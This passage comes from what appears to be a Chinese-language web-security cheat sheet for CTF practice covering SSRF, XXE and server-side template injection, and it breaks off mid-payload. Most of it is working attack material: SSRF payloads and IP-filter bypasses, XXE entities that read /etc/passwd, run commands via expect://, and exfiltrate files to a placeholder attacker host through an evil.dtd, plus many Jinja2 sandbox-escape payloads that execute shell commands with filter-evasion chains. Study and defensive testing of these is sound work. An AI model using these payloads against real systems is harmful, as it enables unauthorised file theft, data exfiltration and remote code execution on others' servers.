<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="利用手法-2"><a href="#利用手法-2" class="headerlink" title="利用手法"></a>利用手法</h3><p><img src="https://image.3001.net/images/20210114/1610597994_5fffc66a14f5609561c1b.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line">dict://fuzz.wuyun.org:8080/helo:dict</span><br></pre></td></tr></table></figure>

<p>gopher对内网的服务进行攻击，俗称万能协议，可以打ftp、telnet、redis、mysql等服务。简单来说就是把平时对服务的操作改为传入tcp流的数据。</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">https://blog.csdn.net/qq_41107295/article/details/103026470</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/_&lt;data&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注意：使用gopherus.py工具生成的payload需要进行二次url编码，防止出现特殊的字符，因为curl默认会再进行一次解码。</strong></p>
<h3 id="绕过技巧-4"><a href="#绕过技巧-4" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><p>IP绕过（127.0.0.1）：</p>
<ul>
<li>八进制：0177.0.0.1</li>
<li>十六进制：0x7f.0.0.1</li>
<li>十进制整数：2130706433</li>
<li>十六进制整数：0x7f000001</li>
<li>特殊的省略模式：0，127.1，127。0。0。1</li>
</ul>
<p>其他技巧：</p>
<ul>
<li>http(s):&#x2F;&#x2F;sudo.cc&#x2F; 指向 127.0.0.1</li>
</ul>
<p>关于在 RFC 1918 中，以下 IP 地址范围被指定为私有：</p>
<ul>
<li>10.0.0.0～10.255.255.255</li>
<li>172.16.0.0～172.31.255.255</li>
<li>192.168.0.0～192.168.255.255</li>
<li>127.0.0.1</li>
<li>169.254.0.0</li>
</ul>
<p>所以想要绕过上述私有地址就需要使用vps，vps上写入下面的php代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关于 parse_url 函数，这里给出官网上的示例，可以用来绕过一些正则：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_SCHEME));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_USER));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PASS));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PORT));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_QUERY));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_FRAGMENT));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(8) &#123;</span><br><span class="line">  [&quot;scheme&quot;]=&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  [&quot;host&quot;]=&gt;</span><br><span class="line">  string(8) &quot;hostname&quot;</span><br><span class="line">  [&quot;port&quot;]=&gt;</span><br><span class="line">  int(9090)</span><br><span class="line">  [&quot;user&quot;]=&gt;</span><br><span class="line">  string(8) &quot;username&quot;</span><br><span class="line">  [&quot;pass&quot;]=&gt;</span><br><span class="line">  string(8) &quot;password&quot;</span><br><span class="line">  [&quot;path&quot;]=&gt;</span><br><span class="line">  string(5) &quot;/path&quot;</span><br><span class="line">  [&quot;query&quot;]=&gt;</span><br><span class="line">  string(9) &quot;arg=value&quot;</span><br><span class="line">  [&quot;fragment&quot;]=&gt;</span><br><span class="line">  string(6) &quot;anchor&quot;</span><br><span class="line">&#125;</span><br><span class="line">string(4) &quot;http&quot;</span><br><span class="line">string(8) &quot;username&quot;</span><br><span class="line">string(8) &quot;password&quot;</span><br><span class="line">string(8) &quot;hostname&quot;</span><br><span class="line">int(9090)</span><br><span class="line">string(5) &quot;/path&quot;</span><br><span class="line">string(9) &quot;arg=value&quot;</span><br><span class="line">string(6) &quot;anchor&quot;</span><br></pre></td></tr></table></figure>



<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞通常出现在Web应用程序中使用XML解析器处理不受信任的XML数据时，攻击者通过构造特殊的XML输入来触发漏洞。如果开发人员没有正确地验证和过滤输入，攻击者就可以利用此漏洞执行各种攻击。攻击者可以利用XXE漏洞读取本地文件、执行远程代码或进行拒绝服务攻击等恶意行为。要防止XXE漏洞，开发人员应该对XML解析器进行正确配置并采用安全编码实践，如输入验证、输出编码、最小权限原则等。</p>
<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><ul>
<li><p>内部实体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;test&gt;&amp;writer;&amp;copyright;&lt;/test&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>外部实体（<strong>libxml版本要大于2.9.0</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="利用手法-3"><a href="#利用手法-3" class="headerlink" title="利用手法"></a>利用手法</h3><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/xxeall.png?imageSlim" alt="xxeall"></p>
<p>进行测试查看是否有解析xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">words</span> <span class="string">&quot;Hello XXE !&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;words;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>支持的协议有以下这些：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/%E5%8D%8F%E8%AE%AE.png?imageSlim" alt="协议"></p>
<ol>
<li><p>读取敏感文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/path/to/file&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>执行命令（<strong>需要开启expect扩展</strong>）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://whoami&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>XXE盲注</p>
<p>主要是用于Web服务器可以解析xml，但是没有回显的情况</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip:port/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中<code>evil.dtd</code>文件内容为，注意因为转义的原因要实体化%：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip:port/xxe.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>可以用utf-16编码转换绕过检查，注意大小端的问题，FFFE表示小端，FEFF表示大端</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="string">&#x27;http&#x27;</span>.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span></span><br><span class="line">b&#x27;\xff\xfeh\x00t\x00t\x00p\x00&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="string">&#x27;http&#x27;</span>.encode(<span class="string">&#x27;utf-16be&#x27;</span>)</span></span><br><span class="line">b&#x27;\x00h\x00t\x00t\x00p&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="string">&#x27;http&#x27;</span>.encode(<span class="string">&#x27;utf-16le&#x27;</span>)</span></span><br><span class="line">b&#x27;h\x00t\x00t\x00p\x00&#x27;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><blockquote>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
</blockquote>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/1344396-20200911174631687-758048107.png" alt="img"></p>
<ol>
<li><p>Python</p>
<blockquote>
<p><a href="https://juejin.cn/post/7083291871161614344#heading-0">https://juejin.cn/post/7083291871161614344#heading-0</a></p>
</blockquote>
<p>利用方法就是找到object基类，然后找可以利用的子类及其方法。</p>
<ul>
<li><code>__class__</code>：获取当前对象所属的类</li>
<li><code>__bases__</code>：获取当前类的直接所继承的类，以元祖的形式返回</li>
<li><code>__mro__</code>：获取当前对象所调用的全部类，以元祖的形式返回</li>
<li><code>__subclasses__</code>：获取当前类的所有子类，以列表的形式返回</li>
<li><code>__init__</code>：初始化类</li>
<li><code>__globals__</code>：获取类的所有方法、变量等</li>
</ul>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231203101449629.png?imageSlim" alt="image-20231203101449629"></p>
<p>出现下述情况不能进一步利用，需要找到重载过的类。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231203101617994.png?imageSlim" alt="image-20231203101617994"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231203101709266.png?imageSlim" alt="image-20231203101709266"></p>
<p>之后就寻找可以用的函数或者是类了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231203101844961.png?imageSlim" alt="image-20231203101844961"></p>
<p>常用语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">2</span>*<span class="number">3</span>&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=<span class="string">&#x27;hello&#x27;</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span>() %&#125;success&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__() %&#125;&#123;% <span class="keyword">if</span> i.__name__==<span class="string">&#x27;_wrap_close&#x27;</span> %&#125;&#123;% <span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read() %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>记录一些常用的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">61</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](filename).read()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">29</span>].__call__(<span class="built_in">eval</span>,<span class="string">&#x27;os.system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">117</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># flask</span><br><span class="line">url_for              url_for.__globals__[&#x27;__builtins__&#x27;]</span><br><span class="line">get_flashed_messages url_for.__globals__[&#x27;__builtins__&#x27;]</span><br><span class="line">lipsum               lipsum.__globals__[&#x27;os&#x27;]</span><br><span class="line"></span><br><span class="line">config							 config.__init__.__globals__[&#x27;os&#x27;]</span><br></pre></td></tr></table></figure>

<p>记录一些绕过的姿势：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &lt;class &#x27;os._wrap_close&#x27;&gt;</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;flask.config.Config&#x27;&gt;</span></span><br><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;</span></span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass `&#x27;` and `&quot;`</span></span><br><span class="line"><span class="comment"># request.[args|values|cookies]</span></span><br><span class="line">&#123;&#123;config.__init__.__globals__[request.args.a].popen(request.args.b).read()&#125;&#125;&amp;a=os&amp;b=cat+/flag</span><br><span class="line">&#123;&#123;config.__init__.__globals__[request.values.a].popen(request.values.b).read()&#125;&#125;&amp;a=os&amp;b=cat+/flag</span><br><span class="line">&#123;&#123;config.__init__.__globals__[request.cookies.a].popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">Cookies: a=os;b=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass `[`</span></span><br><span class="line"><span class="comment"># __getitem__</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().pop(<span class="number">132</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__.__getitem__(request.cookies.a).<span class="built_in">eval</span>(request.cookies.b)&#125;&#125;</span><br><span class="line">Cookies: a=__builtins__;b=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass `_`</span></span><br><span class="line"><span class="comment"># |attr(request.cookies.a)</span></span><br><span class="line">&#123;&#123;(x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)(request.cookies.d)).<span class="built_in">eval</span>(request.cookies.e)&#125;&#125;</span><br><span class="line">Cookies: a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass `&#123;&#123;&#125;&#125;`</span></span><br><span class="line"><span class="comment"># &#123;% print() %&#125;</span></span><br><span class="line">&#123;% <span class="built_in">print</span>((x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)(request.cookies.d)).<span class="built_in">eval</span>(request.cookies.e)) %&#125;</span><br><span class="line">Cookies: a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass `request`</span></span><br><span class="line"><span class="comment"># dict()|join</span></span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>) %&#125;		<span class="comment"># _</span></span><br><span class="line">&#123;% <span class="built_in">set</span> init=(a,a,<span class="built_in">dict</span>(init=aa)|join,a,a)|join %&#125;		<span class="comment"># __init__</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=aa)|join,a,a)|join %&#125;		<span class="comment"># __globals__</span></span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(getitem=aa)|join,a,a)|join %&#125;		<span class="comment"># __getitem__</span></span><br><span class="line">&#123;% <span class="built_in">set</span> builtins=(a,a,<span class="built_in">dict</span>(builtins=aa)|join,a,a)|join %&#125;		<span class="comment"># __builtins__</span></span><br><span class="line">&#123;% <span class="built_in">set</span> x=(x|attr(init)|attr(<span class="built_in">globals</span>)|attr(getitem))(builtins) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span> %&#125;		<span class="comment"># __builtins__.chr()</span></span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=<span class="built_in">chr</span>(<span class="number">95</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">105</span>)%2bchr(<span class="number">109</span>)%2bchr(<span class="number">112</span>)%2bchr(<span class="number">111</span>)%2bchr(<span class="number">114</span>)%2bchr(<span class="number">116</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">40</span>)%2bchr(<span class="number">34</span>)%2bchr(<span class="number">111</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">34</span>)%2bchr(<span class="number">41</span>)%2bchr(<span class="number">46</span>)%2bchr(<span class="number">112</span>)%2bchr(<span class="number">111</span>)%2bchr(<span class="number">112</span>)%2bchr(<span class="number">101</span>)%2bchr(<span class="number">110</span>)%2bchr(<span class="number">40</span>)%2bchr(<span class="number">34</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">116</span>)%2bchr(<span class="number">32</span>)%2bchr(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%2bchr(<span class="number">34</span>)%2bchr(<span class="number">41</span>)%2bchr(<span class="number">46</span>)%2bchr(<span class="number">114</span>)%2bchr(<span class="number">101</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">100</span>)%2bchr(<span class="number">40</span>)%2bchr(<span class="number">41</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span>(x.<span class="built_in">eval</span>(cmd)) %&#125;</span><br><span class="line"><span class="comment"># &#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103) %&#125;</span></span><br><span class="line"><span class="comment"># &#123;% print(x.open(file).read()) %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass number</span></span><br><span class="line"><span class="comment"># |length or |count</span></span><br><span class="line">&#123;% <span class="built_in">set</span> two=(<span class="built_in">dict</span>(aa=a)|join|length)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> three=(<span class="built_in">dict</span>(aaa=a)|join|length)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> four=(<span class="built_in">dict</span>(aaaa=a)|join|length)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> five=(<span class="built_in">dict</span>(aaaaa=a)|join|length)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> seven=(<span class="built_in">dict</span>(aaaaaaa=a)|join|length)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> eight=(<span class="built_in">dict</span>(aaaaaaaa=a)|join|length)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> nine=(<span class="built_in">dict</span>(aaaaaaaaa=a)|join|length)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ten=(<span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length)%&#125;</span><br><span class="line"><span class="comment"># &#123;% set a=(dict(n=z)|join) %&#125;</span></span><br><span class="line"><span class="comment"># &#123;% set b=(dict(o=z)|join) %&#125;</span></span><br><span class="line"><span class="comment"># &#123;% set all=(()|select|string|list) %&#125;</span></span><br><span class="line"><span class="comment"># &#123;% set tf=all.index(a)*all.index(b) %&#125;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> tf=(two~four)|<span class="built_in">int</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(tf) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> init=(a,a,<span class="built_in">dict</span>(init=aa)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=aa)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(a,a,<span class="built_in">dict</span>(getitem=aa)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% 